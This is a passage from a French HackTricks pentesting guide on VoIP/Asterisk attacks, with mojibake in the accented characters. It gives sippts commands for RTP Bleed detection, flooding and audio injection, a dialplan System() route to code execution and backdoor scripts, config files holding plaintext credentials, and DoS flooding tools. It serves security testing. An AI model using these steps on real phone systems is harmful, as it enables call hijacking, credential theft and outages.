Un autre comportement int√©ressant des proxies RTP et des piles RTP est que parfois, **m√™me s'ils ne sont pas vuln√©rables au RTP Bleed**, ils vont **accepter, transmettre et/ou traiter des paquets RTP de n'importe quelle source**. Par cons√©quent, les attaquants peuvent envoyer des paquets RTP qui peuvent leur permettre d'injecter leurs m√©dias au lieu de ceux l√©gitimes. Nous appelons cette attaque injection RTP car elle permet l'injection de paquets RTP ill√©gitimes dans des flux RTP existants. Cette vuln√©rabilit√© peut √™tre trouv√©e √† la fois dans les proxies RTP et les points d'extr√©mit√©.

Asterisk et FreePBX ont traditionnellement utilis√© le param√®tre **`NAT=yes`**, qui permet au trafic RTP de contourner l'authentification, entra√Ænant potentiellement l'absence de son ou un son unidirectionnel lors des appels.

Pour plus d'informations, consultez [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`SIPPTS rtpbleed`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed d√©tecte la vuln√©rabilit√© RTP Bleed en envoyant des flux RTP.
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** de [**sippts**](https://github.com/Pepelux/sippts)** :** SIPPTS rtcpbleed d√©tecte la vuln√©rabilit√© RTP Bleed en envoyant des flux RTCP.
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** de [**sippts**](https://github.com/Pepelux/sippts)** :** SIPPTS rtpbleedflood exploite la vuln√©rabilit√© RTP Bleed en envoyant des flux RTP.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** de [**sippts**](https://github.com/Pepelux/sippts)** :** SIPPTS rtpbleedinject exploite la vuln√©rabilit√© RTP Bleed en injectant un fichier audio (format WAV).
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

Dans Asterisk, si vous parvenez d'une mani√®re ou d'une autre √† **ajouter des r√®gles d'extension et √† les recharger** (par exemple en compromettant un serveur de gestion web vuln√©rable), il est possible d'obtenir une RCE en utilisant la commande **`System`**.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Il existe une commande appel√©e **`Shell`** qui pourrait √™tre utilis√©e **au lieu de `System`** pour ex√©cuter des commandes syst√®me si n√©cessaire.

{% hint style="warning" %}
Si le serveur **interdit l'utilisation de certains caract√®res** dans la commande **`System`** (comme dans Elastix), v√©rifiez si le serveur web permet de **cr√©er des fichiers d'une mani√®re ou d'une autre dans le syst√®me** (comme dans Elastix ou trixbox), et utilisez-le pour **cr√©er un script de porte d√©rob√©e** que vous pourrez ensuite utiliser avec **`System`** pour **ex√©cuter** ce **script**.
{% endhint %}

#### Fichiers locaux int√©ressants et autorisations

* **`sip.conf`** -> Contient le mot de passe des utilisateurs SIP.
* Si le **serveur Asterisk fonctionne en tant que root**, vous pourriez compromettre le root.
* L'utilisateur **root de mysql** pourrait **ne pas avoir de mot de passe**.
* cela pourrait √™tre utilis√© pour cr√©er un nouvel utilisateur mysql comme porte d√©rob√©e.
* **`FreePBX`**
* **`amportal.conf`** -> Contient le mot de passe de l'administrateur du panneau web (FreePBX).
* **`FreePBX.conf`** -> Contient le mot de passe de l'utilisateur FreePBX utilis√© pour acc√©der √† la base de donn√©es.
* cela pourrait √™tre utilis√© pour cr√©er un nouvel utilisateur mysql comme porte d√©rob√©e.
* **`Elastix`**
* **`Elastix.conf`** -> Contient plusieurs mots de passe en clair comme le mot de passe root mysql, le mot de passe IMAPd, le mot de passe de l'administrateur web.
* **Plusieurs dossiers** appartiendront √† l'utilisateur Asterisk compromis (s'il ne fonctionne pas en tant que root). Cet utilisateur peut lire les fichiers pr√©c√©dents et contr√¥le √©galement la configuration, il pourrait donc faire en sorte qu'Asterisk charge d'autres binaires avec des portes d√©rob√©es lors de l'ex√©cution.

### Injection RTP

Il est possible d'ins√©rer un fichier **`.wav`** dans les conversations en utilisant des outils tels que **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) et **`rtpmixsound`** (`sudo apt install rtpmixsound`).

Ou vous pourriez utiliser les scripts de [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) pour **analyser les conversations** (**`rtpscan.pl`**), envoyer un fichier `.wav` √† une conversation (**`rtpsend.pl`**) et **ins√©rer du bruit** dans une conversation (**`rtpflood.pl`**).

### DoS

Il existe plusieurs fa√ßons de tenter de r√©aliser une attaque par d√©ni de service (DoS) sur des serveurs VoIP.

* **`SIPPTS flood`** de [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS flood envoie des messages illimit√©s √† la cible.
* `sippts flood -i 10.10.0.10 -m invite -v`
* **`SIPPTS ping`** de [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS ping envoie un ping SIP pour voir le temps de r√©ponse du serveur.
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS du protocole IAX utilis√© par Asterisk.
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Un outil pour effectuer une inondation de messages SIP/SDP INVITE sur UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): Envoie plusieurs paquets RTP bien form√©s. Il est n√©cessaire de conna√Ætre les ports RTP utilis√©s (sniffer d'abord).
* [**SIPp**](https://github.com/SIPp/sipp): Permet d'analyser et de g√©n√©rer du trafic SIP. donc il peut √©galement √™tre utilis√© pour une attaque DoS.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): Couteau suisse SIP. Peut √©galement √™tre utilis√© pour des attaques SIP.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### Vuln√©rabilit√©s du syst√®me d'exploitation

La mani√®re la plus simple d'installer un logiciel tel qu'Asterisk est de t√©l√©charger une **distribution OS** qui l'a d√©j√† install√©, comme: **FreePBX, Elastix, Trixbox**... Le probl√®me avec ceux-ci est qu'une fois qu'ils fonctionnent, les administrateurs syst√®me pourraient **ne pas les mettre √† jour √† nouveau** et des **vuln√©rabilit√©s** seront d√©couvertes avec le temps.

## R√©f√©rences

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez** üí¨ le groupe Discord](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
